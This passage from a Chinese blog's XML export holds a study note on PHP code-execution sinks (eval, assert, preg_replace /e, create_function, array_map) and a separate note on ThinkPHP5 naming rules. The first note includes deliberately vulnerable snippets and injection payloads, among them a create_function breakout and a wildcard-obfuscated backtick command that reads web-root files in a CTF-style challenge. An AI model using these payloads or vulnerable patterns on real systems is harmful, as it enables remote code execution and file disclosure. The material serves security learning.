<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(<span class="string">'&lt;?php echo "Hi!"; ?&gt;'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(<span class="string">'echo "In PHP mode!"; ?&gt;In HTML mode!&lt;?php echo "Hi!";'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span>闭合php文件开头的<span class="php"><span class="meta">&lt;?php</span>，<span class="meta">&lt;?</span>=可以输出。</span></span><br><span class="line"><span class="php">另外这里<span class="meta">&lt;?</span> <span class="meta">?&gt;</span></span>是短标签，<span class="php"><span class="meta">&lt;?php</span> <span class="meta">?&gt;</span></span>是长标签。在php的配置文件php.ini中有一个short_open_tag的值，开启以后可以使用PHP的短标签：<span class="php"><span class="meta">&lt;?</span> <span class="meta">?&gt;</span></span>同时，</span><br><span class="line">只有开启这个才可以使用 <span class="php"><span class="meta">&lt;?</span>= 以代替 <span class="meta">&lt;?</span> <span class="keyword">echo</span>。不过在php7中这个标签被移除了。</span></span><br></pre></td></tr></table></figure></div>
### &lt;font color = red&gt;assert()函数&lt;/font&gt;  
bool assert ( mixed $assertion [, string $description ] )    
在PHP语言中是用来判断一个表达式是否成立，返回true or false。    
如果assertion 是字符串，它将会被assert（）当做PHP代码来执行。    
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$s = <span class="number">123</span>;</span></span><br><span class="line"><span class="php">var_dump(assert(<span class="string">"is_int($s)"</span>));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">fo</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">  $fp = fopen(<span class="string">"E://2.txt"</span>,<span class="string">'w'</span>);</span></span><br><span class="line"><span class="php">  fwrite($fp,<span class="string">"123"</span>);</span></span><br><span class="line"><span class="php">  fclose($fp);</span></span><br><span class="line"><span class="php">  <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">var_dump(assert(<span class="string">"fo()"</span>));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
函数原理：https://www.jianshu.com/p/6f7cc896ba2a
### &lt;font color = red&gt;preg_replace()函数&lt;/font&gt;
preg_replace 执行一个正则表达式的搜索和替换。
</code></pre></li>
</ul>
<p>执行代码需要使用<code>/e</code>修饰符。如果不使用<code>/e</code>修饰符，代码则不会执行。这个函数比较早，5.5中它已经被弃用了，但是你一样可以去使用它，但是在7.0之后，你就没办法去调用。    </p>
<p>它的参数和返回如下：   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="built_in">int</span> $limit = <span class="number">-1</span> [, <span class="built_in">int</span> &amp;$count ]] )</span><br></pre></td></tr></table></figure></div>

<p>搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换。<br>参数说明：<br>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。<br>$replacement: 用于替换的字符串或字符串数组。<br>$subject: 要搜索替换的目标字符串或字符串数组。<br>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。<br>$count: 可选，为替换执行的次数。    </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@preg_replace(<span class="string">"/\[(.*)\]/e"</span>,<span class="string">'\\1'</span>,$_GET[<span class="string">'str'</span>]);</span><br><span class="line">/<span class="regexp">/preg_replace函数需要使用/e</span>修饰符执行正则。</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>正则的意思是GET传递的str变量里搜索中括号口中间的内容作为第一组结果， preg_replace（）函数<br>第二个参数为 ‘\\1’代表这里用第一组结果填充，这里是可以直接执行代码的，所以当我们请求 /1.php?str=[phpinfo()]时，则执行代码phpinfo()</p>
<p>这个函数比较复杂，感兴趣的可以去这个博客看看   </p>
<p><code>https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#%E6%A1%88%E4%BE%8B</code></p>
<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a><font color = red>create_function</font></h3><p>说明</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">string create_function ( string $args , string $code )</span><br></pre></td></tr></table></figure></div>

<p>该函数用来创建匿名函数。<br>这个函数的实现大概是这样的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$b = create_function(<span class="string">'$name'</span>,<span class="string">'echo $name;'</span>);</span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b(yang);</span><br><span class="line"></span><br><span class="line">niming(<span class="string">'yang'</span>);</span><br></pre></td></tr></table></figure></div>

<p>第二个参数是执行代码的地方，将payload放在第二个参数的位置，然后调用该函数就可以执行payload了。<br>执行代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">'phpinfo();'</span>;</span><br><span class="line">$b = create_function(<span class="string">" "</span>,$a);</span><br><span class="line">$b();</span><br></pre></td></tr></table></figure></div>

<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a><font color = red>array_map()</font></h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">array array_map ( callable $callback ,<span class="built_in"> array </span>$array1 [,<span class="built_in"> array </span>$... ] )</span><br><span class="line">array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</span><br></pre></td></tr></table></figure></div>

<p>漏洞演示</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//?a=assert&amp;b=phpinfo();</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$array[<span class="number">0</span>] = $b;</span><br><span class="line">$c = array_map($a,$array);</span><br></pre></td></tr></table></figure></div>

<h3 id="eval-函数例题："><a href="#eval-函数例题：" class="headerlink" title="eval()函数例题："></a>eval()函数例题：</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $code = $_GET[<span class="string">'code'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    @<span class="keyword">eval</span>($code);</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p><strong>/bin/cat 执行命令</strong>    </p>
<p><strong>``反单引号执行命令</strong>   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?=`<span class="regexp">/???/</span>???%<span class="number">20</span><span class="regexp">/???/</span>???<span class="regexp">/????/</span>*`?&gt;</span><br><span class="line"><span class="string">"/bin/cat /var/www/html/*"</span></span><br></pre></td></tr></table></figure></div>
<p><strong>无字母数字preg_match绕过</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.cnblogs.com<span class="regexp">/v01cano/</span>p<span class="regexp">/11736722.html</span></span><br></pre></td></tr></table></figure></div>

<h3 id="create-function例题"><a href="#create-function例题" class="headerlink" title="create_function例题"></a>create_function例题</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">$code = <span class="string">'echo $name. '</span>.<span class="string">'的编号是'</span>.$id.<span class="string">'; '</span>;</span><br><span class="line"></span><br><span class="line">$b = create_function(<span class="string">'$name'</span>,$code);</span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $name.<span class="string">"编号"</span>.$id;</span><br><span class="line">&#125;</span><br><span class="line">$b(<span class="string">'sd'</span>);</span><br><span class="line"><span class="comment">//payload：?id=2;&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>WEB安全漏洞</category>
        <category>RCE漏洞</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>1.thinkphp5开发规范</title>
    <url>/undefined/1.thinkphp5%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[<h1 id="一丶URL访问"><a href="#一丶URL访问" class="headerlink" title="一丶URL访问"></a><font color=green>一丶URL访问</font></h1><h2 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a><font color=green>命名规范</font></h2><h3 id="ThinkPHP5-遵循-PSR-2-命名规范和-PSR-4-自动加载规范，并且注意如下规范："><a href="#ThinkPHP5-遵循-PSR-2-命名规范和-PSR-4-自动加载规范，并且注意如下规范：" class="headerlink" title="ThinkPHP5 遵循 PSR-2 命名规范和 PSR-4 自动加载规范，并且注意如下规范："></a>ThinkPHP5 遵循 PSR-2 命名规范和 PSR-4 自动加载规范，并且注意如下规范：</h3><h3 id="目录和文件"><a href="#目录和文件" class="headerlink" title="目录和文件"></a><font color=red>目录和文件</font></h3><ul>
<li>目录使用小写+下划线；  </li>
<li>类库、 函数文件统一以 .php 为后缀；   </li>
<li>类的文件名均以命名空间定义，并且命名空间的路径和类库文件所在路径一致；   </li>
<li>类文件采用驼峰法命名（首字母大写），其它文件采用小写+下划线命名；   </li>
<li>类名和类文件名保持一致，统一采用驼峰法命名（首字母大写）；   <h3 id="函数和类、-属性命名"><a href="#函数和类、-属性命名" class="headerlink" title="函数和类、 属性命名  "></a><font color=red>函数和类、 属性命名  </font></h3></li>
<li>类的命名采用驼峰法（首字母大写），例如 User 、 UserType ，默认不需要添加后缀，例如<br>UserController 应该直接命名为 User ；   </li>
<li>函数的命名使用小写字母和下划线（小写字母开头）的方式，例如 get_client_ip ；   </li>
<li>方法的命名使用驼峰法（首字母小写），例如 getUserName ；   </li>
<li>属性的命名使用驼峰法（首字母小写），例如 tableName 、 instance ；   </li>
<li>以双下划线“__” 打头的函数或方法作为魔术方法，例如 __call 和 __autoload ；   <h3 id="常量和配置"><a href="#常量和配置" class="headerlink" title="常量和配置"></a><font color=red>常量和配置</font></h3></li>
<li>常量以大写字母和下划线命名，例如 APP_PATH 和 THINK_PATH ；  </li>
<li>配置参数以小写字母和下划线命名，例如 url_route_on 和 url_convert ；    <h3 id="数据表和字段"><a href="#数据表和字段" class="headerlink" title="数据表和字段 "></a><font color=red>数据表和字段 </font></h3></li>
<li>数据表和字段采用小写加下划线方式命名，并注意字段名不要以下划线开头，例如 think_user 表和<br>user_name 字段，不建议使用驼峰和中文作为数据表字段命名。   <h3 id="应用类库命名空间规范"><a href="#应用类库命名空间规范" class="headerlink" title="应用类库命名空间规范"></a><font color=red>应用类库命名空间规范</font></h3></li>
<li>应用类库的根命名空间统一为app（不建议更改，可以设置 app_namespace 配置参数更改， V5.0.8 版本<br>开始使用 APP_NAMESPACE 常量定义）；<br>例如： app\index\controller\Index 和 app\index\model\User 。   </li>
</ul>
]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
</search>
